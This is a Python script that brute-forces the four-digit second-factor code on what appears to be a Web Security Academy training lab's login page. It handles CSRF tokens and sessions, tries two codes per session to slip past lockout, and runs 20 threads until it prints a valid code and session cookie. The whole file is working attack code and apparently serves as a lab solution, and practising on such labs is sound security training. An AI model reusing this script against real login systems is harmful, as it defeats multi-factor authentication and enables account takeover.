import requests
from bs4 import BeautifulSoup
import threading
import concurrent.futures

url = 'https://0a3700230382e3cc879c499c00e400b0.web-security-academy.net/login'
username = 'carlos'
password = 'montoya'
found = threading.Event()
print_lock = threading.Lock()

def get_login(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf = soup.find("input", {"name":"csrf"})["value"]
    return csrf, response.cookies.get("session")

def post_login(url):
    csrf, session = get_login(url)
    response = requests.post(url, cookies={"session":session}, data={"csrf":csrf, "username":username, "password":password}, 
                             allow_redirects=False)
    return response.cookies.get("session")

def get_login2(url):
    session = post_login(url)
    response = requests.get(url + "2", cookies={"session":session})
    soup = BeautifulSoup(response.text, "html.parser")
    csrf = soup.find("input", {"name":"csrf"})["value"]
    return csrf, session

def post_login2(url, mfa_code):
    csrf, session = get_login2(url)
    response = requests.post(url + "2", cookies={"session":session}, data={"csrf":csrf, "mfa-code":mfa_code}, allow_redirects=False)
    if response.status_code == 302:
        return 1, csrf, session, response.cookies.get("session")
    else:
        return 0, csrf, session, response.cookies.get("session")

def post_login2_second_try(url, csrf, session, mfa_code):
    response = requests.post(url + "2", cookies={"session":session}, data={"csrf":csrf, "mfa-code":mfa_code}, allow_redirects=False)
    if response.status_code == 302:
        return 1, response.cookies.get("session")
    else:
        return 0, response.cookies.get("session")

def worker(number1, number2, number3, number4):
    if found.is_set():
        return
    mfa_code = str(number1) + str(number2) + str(number3) + str(number4)
    status, csrf, session, new_session  = post_login2(url, mfa_code)
    if status == 1:
        found.set()
        with print_lock:
            print("Correct mfa_code: ", mfa_code, " Session: ", session, " Csrf: ", csrf, " New session: ", new_session)
        return
    else:
        with print_lock:
            print("Ivalid mfa_code: ", mfa_code, " Session: ", session, " Csrf: ", csrf)
        if found.is_set():
                return
        mfa_code = str(number1) + str(number2) + str(number3) + str(number4+1)
        status2, new_session  = post_login2_second_try(url, csrf, session, mfa_code)
        if status2 == 1:
            found.set()
            with print_lock:
                print("Correct mfa_code: ", mfa_code, " Session: ", session, " Csrf: ", csrf, " New session: ", new_session)
            return
        else:
            with print_lock:
                print("Ivalid mfa_code: ", mfa_code, " Session: ", session, " Csrf: ", csrf)

def mfa_code_breaker(url):
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        for number1 in range(10):
            for number2 in range(10):
                for number3 in range(10):
                    for number4 in range(0, 10, 2):
                        executor.submit(worker, number1, number2, number3, number4)

print(mfa_code_breaker(url))